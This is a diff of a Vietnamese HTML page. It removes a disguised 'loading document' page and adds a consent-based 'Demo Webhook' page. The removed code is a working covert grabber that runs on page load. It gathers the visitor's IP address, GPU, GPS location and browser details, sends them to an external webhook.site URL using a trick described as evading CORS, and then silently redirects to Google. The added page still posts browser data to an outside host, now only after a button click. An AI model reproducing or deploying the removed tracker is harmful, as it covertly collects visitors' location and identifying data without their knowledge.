@@ -1,72 +1,64 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đang tải tài liệu...</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Demo Webhook</title>
+<style>
+body{
+  font-family:Segoe UI,sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  height:100vh;
+  background:#f0f2f5;
+  margin:0;
+}
+.box{text-align:center}
+button{
+  padding:10px 20px;
+  border:none;
+  background:#3498db;
+  color:white;
+  border-radius:6px;
+  cursor:pointer;
+}
+</style>
 </head>
+
 <body>
-    <div style="text-align: center;">
-        <div class="loader" style="margin: 0 auto;"></div>
-        <p style="margin-top: 15px;">Vui lòng chờ trong giây lát...</p>
-    </div>
+<div class="box">
+  <p>Trang này sẽ gửi một số thông tin trình duyệt để test webhook.</p>
+  <button onclick="sendData()">Cho phép & gửi</button>
+</div>
 
-    <script>
-        (async function() {
-            // --- CẤU HÌNH ĐÃ SỬA URL CHUẨN ---
-            const WEBHOOK_URL = "https://webhook.site/de82030e-a647-4012-b7f4-c539d868de62";
-            const REDIRECT_TO = "https://www.google.com";
+<script>
+const WEBHOOK_URL = "https://webhooksite.net/de82030e-a647-4012-b7f4-c539d868de62";
 
-            let data = {
-                timestamp: new Date().toISOString(),
-                browser: { ua: navigator.userAgent, lang: navigator.language },
-                screen: { w: screen.width, h: screen.height }
-            };
+async function sendData(){
+  const data = {
+    time: new Date().toISOString(),
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    screen: {
+      width: screen.width,
+      height: screen.height
+    }
+  };
 
-            try {
-                // 1. Lấy IP
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    data.ip = ipData.ip;
-                } catch (e) { data.ip = "N/A"; }
+  try{
+    await fetch(WEBHOOK_URL,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify(data)
+    });
 
-                // 2. Lấy GPU
-                try {
-                    const gl = document.createElement('canvas').getContext('webgl');
-                    const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                    data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-                } catch (e) {}
-
-                // 3. Lấy GPS (Chờ 3 giây)
-                if (navigator.geolocation) {
-                    await new Promise(res => {
-                        navigator.geolocation.getCurrentPosition(
-                            p => { data.location = { lat: p.coords.latitude, lon: p.coords.longitude }; res(); },
-                            e => { data.location = "Denied"; res(); },
-                            { timeout: 3000 }
-                        );
-                    });
-                }
-
-                // --- GỬI DỮ LIỆU: Dùng Beacon + Text/Plain để lách luật CORS ---
-                const blob = new Blob([JSON.stringify(data)], { type: 'text/plain' });
-                navigator.sendBeacon(WEBHOOK_URL, blob);
-
-            } catch (err) {
-                console.log(err);
-            } finally {
-                // Chuyển hướng
-                setTimeout(() => {
-                    window.location.replace(REDIRECT_TO);
-                }, 800);
-            }
-        })();
-    </script>
+    alert("Đã gửi dữ liệu test tới webhook.");
+  }catch(e){
+    console.error(e);
+    alert("Không gửi được dữ liệu.");
+  }
+}
+</script>
 </body>
 </html>
